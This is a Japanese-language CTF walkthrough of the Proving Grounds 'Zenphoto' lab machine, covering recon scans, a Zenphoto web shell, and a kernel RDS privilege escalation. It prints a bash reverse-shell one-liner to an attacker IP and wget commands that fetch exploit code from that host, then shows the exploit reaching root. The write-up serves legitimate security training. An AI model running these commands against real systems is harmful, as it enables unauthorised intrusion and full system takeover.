+++
title = "Proving Grounds Practice - Zenphoto Writeup"
date = "2026-10-15"
description = "Zenphoto 1.4.1.4のWebシェル機能を悪用して初期アクセスを獲得し、Linuxカーネルの脆弱性(RDS socket exploit)を利用して特権昇格"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Zenphoto 1.4.1.4 - Remote Code Execution]", "[gobuster]", "[Kernel Exploit - RDS Privilege Escalation]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Zenphoto |
| OS | Linux |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p-  192.168.157.41
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 19:11 +0900
Nmap scan report for 192.168.157.41
Host is up (0.081s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-server-header: CUPS/1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.71 seconds
```

```bash
nmap -sU -sC 192.168.157.41
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 19:39 +0900
Nmap scan report for 192.168.157.41
Host is up (0.11s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT     STATE SERVICE
5353/udp open  zeroconf
| dns-service-discovery: 
|   9/tcp workstation: 
|     ipv4: 192.168.157.41
|     ipv6: fe80::250:56ff:feab:f1ea
|     name: offsecsrv [00:50:56:ab:f1:ea]
|_    hostname: offsecsrv

Nmap done: 1 IP address (1 host up) scanned in 1354.27 seconds
```

### Directory Enumeration

```bash
gobuster dir -u http://192.168.157.41/ -w /usr/share/wordlists/dirb/common.txt
```

```text
.hta                 (Status: 403) [Size: 286]
.htpasswd            (Status: 403) [Size: 291]
.htaccess            (Status: 403) [Size: 291]
cgi-bin/             (Status: 403) [Size: 290]
index                (Status: 200) [Size: 75]
index.html           (Status: 200) [Size: 75]
test                 (Status: 301) [Size: 315] [--> http://192.168.157.41/test/]
server-status        (Status: 403) [Size: 295]
Progress: 4613 / 4613 (100.00%)
```

```bash
gobuster dir -u http://192.168.157.41/test/ -w /usr/share/wordlists/dirb/common.txt
```

```text
.hta                 (Status: 403) [Size: 291]
.htaccess            (Status: 403) [Size: 296]
.htpasswd            (Status: 403) [Size: 296]
albums               (Status: 301) [Size: 322] [--> http://192.168.157.41/test/albums/]
cache                (Status: 301) [Size: 321] [--> http://192.168.157.41/test/cache/]
favicon.ico          (Status: 200) [Size: 1406]
index                (Status: 200) [Size: 5015]
index.php            (Status: 200) [Size: 5015]
plugins              (Status: 301) [Size: 323] [--> http://192.168.157.41/test/plugins/]
robots.txt           (Status: 200) [Size: 190]
robots               (Status: 200) [Size: 190]
themes               (Status: 301) [Size: 322] [--> http://192.168.157.41/test/themes/]
uploaded             (Status: 301) [Size: 324] [--> http://192.168.157.41/test/uploaded/]
Progress: 4613 / 4613 (100.00%)
```

```text
http://192.168.157.41/test/

zenphoto version 1.4.1.4
```

---

## exploit

zenphoto管理機能を通じてシェル(zenphoto-shell)を取得。

```bash
zenphoto-shell# ls
```

```text
class.auth.php
class.file.php
class.history.php
class.image.php
class.manager.php
class.pagination.php
class.search.php
class.session.php
class.sessionaction.php
class.upload.php
config.base.php
config.php
config.tinymce.php
data.php
function.base.php
```

```bash
find / -name 'local.txt' 2>/dev/null
```

攻撃者側でリスナーを起動:

```bash
nc -lvnp 4444
```

zenphoto-shell経由でリバースシェルを実行:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1'
```

www-data権限のインタラクティブシェルを取得。

---

## Privilege Escalation

攻撃者側でHTTPサーバーを起動し、ターゲット側でwgetを使用して特権昇格用のエクスプロイトを転送。

```bash
wget http://192.168.45.156:80/linpeas.sh
```

ターゲット側でダウンロードしてコンパイル

```bash
wget http://192.168.45.156:80/exp.c
```

```bash
www-data@offsecsrv:/tmp$ gcc exp.c -o hoge
www-data@offsecsrv:/tmp$ chmod +x hoge
www-data@offsecsrv:/tmp$ ls
copyfail.py  exploit    linpeas.sh                      vmware-root
dirtycow.c   exploit.1  linpeas_host_checker_2106.err
exp.c        hoge       linpeas_host_checker_2106.json
www-data@offsecsrv:/tmp$ ./hoge
```

```text
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# 
```

## Summary

Zenphoto 1.4.1.4 のWebシェル機能を悪用し初期アクセス(www-data)を取得 → Linux Kernel RDS socket exploit (Dan Rosenberg) による特権昇格 → root
